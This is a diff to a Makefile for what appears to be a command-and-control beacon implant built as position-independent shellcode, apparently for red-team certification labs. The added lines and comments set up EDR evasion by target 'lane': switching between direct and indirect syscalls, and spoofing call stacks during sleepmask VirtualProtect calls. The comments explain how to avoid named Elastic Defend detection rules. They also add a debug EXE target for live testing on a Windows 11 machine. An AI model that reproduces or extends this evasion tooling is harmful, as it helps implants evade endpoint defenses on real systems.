@@ -31,9 +31,48 @@ NAX_STOMP_ADVANCED ?= 0
 CFLAGS += -DNAX_STOMP_ADVANCED=$(NAX_STOMP_ADVANCED)
 
 # P1: indirect syscalls (HellsGate/HalosGate + Tartarus in-ntdll gadget).
-# 1 = route the 12 direct Nt* calls through asm stubs (default); 0 = direct.
+# Lane-dependent (CRTL/Elastic vs OSAI/Defender) -- see LESSONS "CRTL lane".
+# Indirect syscalls set the `image_indirect_call` behavior that Elastic rule
+# e7d63d66 "VirtualProtect via Indirect Syscall" (kill_process) keys on, and Elastic
+# Defend has NO userland ntdll hooks (its API feed is kernel ETW-TI) -- so on the
+# CRTL/Elastic lane indirect syscalls are pure downside: no hook to bypass, and
+# they add the detection trigger on every VirtualProtect/VirtualAlloc. The direct
+# ntdll stub path (indirect OFF) calls through NtProtectVirtualMemory's own stub ->
+# no image_indirect_call -> no trip. Direct-resolve is also the validated-stable
+# path (LESSONS P1). The Defender/OSAI lane keeps indirect ON as syscall transport
+# + robustness vs EDRs that DO hook stubs.
+#   NAX_LANE=elastic  (CRTL, default): NAX_INDIRECT_SYSCALLS=0 (direct ntdll stubs)
+#   NAX_LANE=defender (OSAI):           NAX_INDIRECT_SYSCALLS=1 (indirect stubs)
+# Override directly: `make NAX_INDIRECT_SYSCALLS=1`.
+NAX_LANE ?= elastic
+ifeq ($(NAX_LANE),defender)
 NAX_INDIRECT_SYSCALLS ?= 1
+else
+NAX_INDIRECT_SYSCALLS ?= 0
+endif
 CFLAGS += -DNAX_INDIRECT_SYSCALLS=$(NAX_INDIRECT_SYSCALLS)
+
+# P4: call-stack spoofing of the sleepmask VirtualProtect (MVP). The beacon is
+# module-stomped (image-backed by address range, but the stomp+sleepmask writes
+# flip the .text pages PRIVATE copy-on-write). Elastic Defend resolves backing
+# at the page level (QueryWorkingSetEx), so a beacon .text frame counts as
+# unbacked -> at every sleepmask VirtualProtect the kernel ETW-TI call stack
+# shows frames 1..7 in private +X (call_stack_contains_unbacked fires, per-frame
+# allocation_private_bytes>0). P4 spoofs those on-stack return addresses with
+# image-backed ntdll addresses for the duration of the VP syscall, then
+# restores. See LESSONS "CRTL lane" + "P4".
+# Lane-dependent like the P1 flag: the CRTL/Elastic lane is where the kernel
+# call-stack feed exists, so spoof ON by default there; the OSAI/Defender lane
+# has no such feed, so OFF (Defender keys on different signals).
+#   NAX_LANE=elastic  (CRTL, default): NAX_SPOOF_STACK=1
+#   NAX_LANE=defender (OSAI):           NAX_SPOOF_STACK=0
+# Override directly: `make NAX_SPOOF_STACK=0` to recover the live-validated
+# pre-P4 beacon behavior.
+NAX_SPOOF_STACK ?= 1
+ifeq ($(NAX_LANE),defender)
+NAX_SPOOF_STACK ?= 0
+endif
+CFLAGS += -DNAX_SPOOF_STACK=$(NAX_SPOOF_STACK)
 
 # Library linking - SMB variant doesn't need winhttp or iphlpapi
 ifeq ($(NAX_TRANSPORT_PROFILE),1)
@@ -182,7 +221,17 @@ DEBUG_CFLAGS += -DNAX_STOMP_ADVANCED=$(NAX_STOMP_ADVANCED)
 # or in the first stub call. P1 was previously OFF here (=0): source-complete
 # but never runtime-validated, it crashed at boot ("prints nothing, no
 # callback"). Flip back to 0 only to re-validate P2 (sleepmask) in isolation.
-DEBUG_CFLAGS += -DNAX_INDIRECT_SYSCALLS=1
+# Debug now follows the lane (NAX_INDIRECT_SYSCALLS): CRTL/elastic builds the
+# direct-resolve path (no image_indirect_call); `make debug NAX_LANE=defender`
+# builds the indirect path. Do not hardcode =1 here -- it would silently force
+# the indirect (Elastic-detected) path into the CRTL test vehicle.
+DEBUG_CFLAGS += -DNAX_INDIRECT_SYSCALLS=$(NAX_INDIRECT_SYSCALLS)
+
+# P4 stack-spoof follows the lane (NAX_SPOOF_STACK): the debug EXE is the
+# live-validation vehicle, so it must build the same spoof path the release
+# elastic blob ships. Do not hardcode =1 here -- it would silently force the
+# spoof path into the defender debug build.
+DEBUG_CFLAGS += -DNAX_SPOOF_STACK=$(NAX_SPOOF_STACK)
 
 # debug: PIC shellcode with debug prints baked in - load via loader exactly like
 # the release blob.  -Os kept for size; -DDEBUG_PIC guards the CRT main() stub.
@@ -246,3 +295,27 @@ C_DEPS         := $(C_OBJS:.obj=.d)
 DEBUG_PIC_DEPS := $(DEBUG_PIC_OBJS:.obj=.d)
 -include $(C_DEPS)
 -include $(DEBUG_PIC_DEPS)
+
+# ========= [ debug-exe: CRT-linked console EXE (live-validation vehicle) ] =========
+#
+# `re.exe` on the target: a CRT-linked EXE whose main() calls NaxMain() (guarded
+# by `#if defined(DEBUG) && !defined(DEBUG_PIC)` in Main.c). Run directly on the
+# Win11 target with no loader - NaxDbg console diagnostics + the [sleepmask] /
+# [spoof] lines appear in the console. Built from the same DEBUG_CFLAGS as the
+# PIC debug blob (so it follows the lane: NAX_INDIRECT_SYSCALLS + NAX_SPOOF_STACK),
+# minus the PIC-only flags (-DDEBUG_PIC, -fPIC, -nostdlib, -ffunction-sections).
+DEBUG_EXE_CFLAGS := $(DEBUG_CFLAGS) -MMD -MP -mconsole
+DEBUG_EXE_OBJS := $(patsubst %.c,$(BUILD)/%.dexe.obj,$(C_SRCS_FLAT))
+DEBUG_EXE_OUT := $(BUILD)/beacon.x64.debug.exe
+
+$(BUILD)/%.dexe.obj: %.c | $(BUILD)
+	$(CC) $(DEBUG_EXE_CFLAGS) -c $< -o $@
+
+debug-exe: $(ASM_OBJS) $(DEBUG_EXE_OBJS) | $(BUILD)
+	$(CC) $(DEBUG_EXE_CFLAGS) \
+	    $(ASM_OBJS) $(DEBUG_EXE_OBJS) -o $(DEBUG_EXE_OUT) \
+	    $(LINK_LIBS)
+	@echo "  DEBUG_EXE  $(DEBUG_EXE_OUT)  ($$(wc -c < $(DEBUG_EXE_OUT)) bytes)"
+
+DEBUG_EXE_DEPS := $(DEBUG_EXE_OBJS:.obj=.d)
+-include $(DEBUG_EXE_DEPS)
